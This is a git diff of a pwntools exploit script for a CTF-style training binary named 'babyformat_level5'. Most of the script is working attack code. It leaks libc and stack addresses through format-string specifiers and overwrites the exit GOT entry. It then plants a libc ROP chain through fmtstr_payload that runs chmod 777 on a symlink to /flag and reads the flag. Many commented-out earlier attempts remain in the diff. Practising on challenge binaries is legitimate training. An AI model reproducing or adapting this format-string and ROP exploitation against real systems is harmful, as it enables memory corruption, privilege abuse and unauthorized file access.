@@ -3,15 +3,13 @@
 # This exploit template was generated via:
 # $ pwn template babyformat_level5
 from pwn import *
+from os import system
 
+## working code
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level5')
+context.arch = 'amd64'
 context.terminal = ["tmux", "splitw", "-h"]
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -20,9 +18,6 @@ def start(argv=[], *a, **kw):
     else:
         return process([exe.path] + argv, *a, **kw)
 
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
 gdbscript = '''
 tbreak main
 continue
@@ -38,80 +33,140 @@ continue
 # PIE:      No PIE (0x400000)
 
 io = start()
+# rop = ROP('/lib/x86_64-linux-gnu/libc.so.6')
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+# payload = b"%04199028d%26$lnAAAAAAA" + p64(0x404060) 
+# io.sendline(payload)
+# print(io.recvline())
 
-# exploit = f"%150$p"
-# io.sendline(exploit)
+def rop(base):
+    # ln -s /flag group for symlink to string in libc
+    pop_rdi = base + 0x23b6a # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+    pop_rsi = base + 0x2601f # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+    pop_rdx = base + 0x142c92 # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+    pop_rax = base + 0x36174  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+    syscall = base + 0x2284d  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"
+
+    rop = b''
+    rop += p64(pop_rdi) 
+    rop += p64(base + 0x1eb1f3)  #  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "group"
+    rop += p64(pop_rsi) 
+    rop += p64(0o777)         # set permissions to 777
+    rop += p64(pop_rdx) + p64(0)         # not used
+    rop += p64(pop_rax) 
+    rop += p64(0x5a)          # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "chmod"
+    rop += p64(syscall)       # call syscall to execute the ROP chain
+    return rop
+
+exploit = f"%3$lx %150$p %04199001d%27$lnAA"
+
+payload = exploit.encode() + p64(0x404060)
+io.sendline(payload)
+
+io.recvuntil(b"Your input is:")
+io.recvline()
+leak_bytes = io.recvline(keepends=False)
+# print(f"leak_bytes : {leak_bytes}")
+leak = leak_bytes.decode().split(' ')
+print(f"leak_bytes : {leak[0], leak[1]}")
+
+print(f"leaked_libc_func : {leak[0]}")
+leaked_libc_func_int = int(leak[0], 16)
+libc_base = leaked_libc_func_int - 0x10e077
+print(f"libc_base : 0x{libc_base:x}")
+
+leaked_rbp = leak[1]
+print(f"leaked rbp : {leaked_rbp}")
+rbp_main = int(leaked_rbp, 16)
+rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
+print(f"leaked rbp func : {hex(rbp_func)}")
+leaked_ret = rbp_func + 8
+rip_func_addr = leaked_ret
+print(f"leaked rip func : {hex(leaked_ret)}")
+rsp_func=rbp_func-1152 # 1152 = diff between rbp and rsp
+print(f"rsp_func:0x{rsp_func:x}")
+
+rop_chain_len = len(rop(libc_base))
+print("rop chain length ",rop_chain_len)
+# rsp - rdi / 8 = 23.1 -> %24lx = buffer address
+
+# p2 = f"%24$pAA".encode() + rop(libc_base) 
+# io.sendline(p2)
+# io.recvuntil(b"Your input is:")
+# print(io.recvline())
+
+# leak_bytes_1 = io.recvline(keepends=False)
+# print(f"leak_bytes_1 : {leak_bytes_1}")
+# leak1 = leak_bytes_1.split(b'A')
+# print(f"leak_bytes_1 : {leak1[0]}")
+# buf_addr_int = int(leak1[0], 16)
+# buf_addr = buf_addr_int - 41 - 7
+# buf_len = len(str(buf_addr))
+# print("buf_len", buf_len)
+# p3 = f"%{buf_addr}d%26$lnAA".encode() + rop(0x404060) # x = 15 + 6 + 
+# io.sendline(p3)
+
+# print("leave ret on exit location started")
+# leave_ret=0x578c8 #ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "leave|ret" 0xc7aa3
+# p4= b"%0817786d%26$ln" +p64(0x404060)
+# io.sendline(p4)
+# print("leave ret on exit location completed")
+# print(io.recvline())
+# print(io.recvline())
+# print(io.recvline())
+# print(io.recvline())
+# print(io.recvline())
+
+# exploit2 = f"%3$lx %150$p"
+# io.sendline(exploit2)
 # io.recvuntil(b"Your input is:")
 # io.recvline()
-# leaked_rbp = io.recvline(keepends=False)
-# print(f"leaked rbp : {leaked_rbp}")
-# rbp_main = int(leaked_rbp, 16)
-# rbp_func = rbp_main - 80 
-# print(f"leaked rbp_func : {hex(rbp_func)}")
-# leaked_ret = rbp_func + 8
-# rip_func = leaked_ret
-# print(f"leaked rip_func : {hex(leaked_ret)}")
+# leak_bytes2 = io.recvline(keepends=False)
+# leak2 = leak_bytes2.decode().split(' ')
+# libc_base_2=int(leak2[0], 16) - 0x10e077
+# print(f"libc_base_2 : 0x{libc_base_2:x}")
+# leaked_rbp_main2 = int(leak2[1], 16)
+# leaked_rbp_func2 = leaked_rbp_main2 - 80
+# leaked_rip_func2 = leaked_rbp_func2 +8
+# print(f"leaked_rbp_main2 : 0x{leaked_rbp_main2:x}")
+# print(f"leaked_rbp_func2 : 0x{leaked_rbp_func2:x}")
+# print(f"leaked_rip_func2 : 0x{leaked_rip_func2:x}")
+# print(f"rbp main difference : {rbp_main - leaked_rbp_main2}") #diff = 80
+# print(f"rbp func difference : {rbp_func-leaked_rbp_func2}") #diff = 80
+# print(f"rip func difference : {rip_func_addr-leaked_rip_func2}") #diff = 80
+# print(f"libc_base_2 difference: {libc_base-libc_base_2}") #diff = 0, it doesn't change
 
-# payload = b"%04199028d%20$lnAAAAAAA" + p64(0x404060) #exit got -> func
-# payload = b"%04199028d%24$lnAAAAAAA" + p64(0x404060) #exit got -> func
-# exit_loc=0x404060
-# writes = {exit_loc:4199069}
-# payload = b'a'*7+fmtstr_payload(20, writes, numbwritten=41)
-# payload =fmtstr_payload(20, writes, numbwritten=41)
-# print(payload)
-# io.send(payload)
 
-# io.recvuntil(b"Your input is:")
 
-# def send_fmt_payload(payload):
-#      print(repr(payload))
-#      io.sendline(payload)
-#      return io.recv()
+rbp_func2 = rbp_func - (1*1168) # difference between func rbp previous frame and new frame
+new_rsp=rsp_func - (1*1168)
+print(f"rbp_func2 : 0x{rbp_func2:x}")
+print(f"rsp_func2 : 0x{new_rsp:x}")
+base = libc_base
+# ln -s /flag group for symlink to string in libc
+pop_rdi = 0x23b6a # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+pop_rsi = 0x2601f # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+pop_rdx = 0x142c92 # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+pop_rax = 0x36174  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
+syscall = 0x2284d  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"
+rip = rbp_func2+8 
 
-# f.write(0x404060, 0x40129d)
-# f.execute_writes()
+print("rop chain send started")
+p5 = b"A"*7 + fmtstr_payload(24, {
+    0x404060 : p64(base+0x578c8).ljust(8, b"\x00"),
+    new_rsp : p64(base + pop_rdi).ljust(8, b"\x00"),
+    new_rsp + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
+    new_rsp + 16 : p64(base + pop_rsi).ljust(8, b"\x00"),
+    new_rsp + 24 : p64(0o777),
+    new_rsp + 32 : p64(base + pop_rdx).ljust(8, b"\x00"),
+    new_rsp + 40 : p64(0),
+    new_rsp + 48 : p64(base + pop_rax).ljust(8, b"\x00"),
+    new_rsp + 56 : p64(0x5a),
+    new_rsp + 64 : p64(base + 0x2284d).ljust(8, b"\x00")
+    }, numbwritten=48, write_size='short', strategy='fast')
 
-# exploit = f"%150$p"
-# io.sendline(exploit)
-# io.recvuntil(b"Your input is:")
-# io.recvline()
-# leaked_rbp = io.recvline(keepends=False)
-# print(f"leaked rbp : {leaked_rbp}")
-# rbp_main = int(leaked_rbp, 16)
-# rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
-# print(f"leaked rbp_func : {hex(rbp_func)}")
-# leaked_ret = rbp_func + 8
-# rip_func = leaked_ret
-# print(f"leaked rip_func : {hex(leaked_ret)}")
-def leak_libc():
-    pop_rdi=p64(0x4015d3)
-    got_put=p64(0x404020)
-    plt_put=p64(0x4010e0)
-    chain = pop_rdi + got_put + plt_put
-    return chain
-
-    
-exploit = leak_libc() + p64(0x4014c4) 
-print('here')
-io.sendline(exploit)
-print('here')
-leaked_bytes = io.recvline(keepends=False)
-leaked_bytes = io.recvline(keepends=False)
-leaked_puts = u64(leaked_bytes.ljust(8, b"\0"))
-print(f"leaked puts: 0x{leaked_puts:x}")
-offset_puts = 0x84420
-base_libc = leaked_puts - offset_puts
-
-print(f"base of libc: 0x{base_libc:x}")
-
+io.sendline(p5)
+print("rop chain send completed")
+system("cat /flag")
 io.interactive()
 
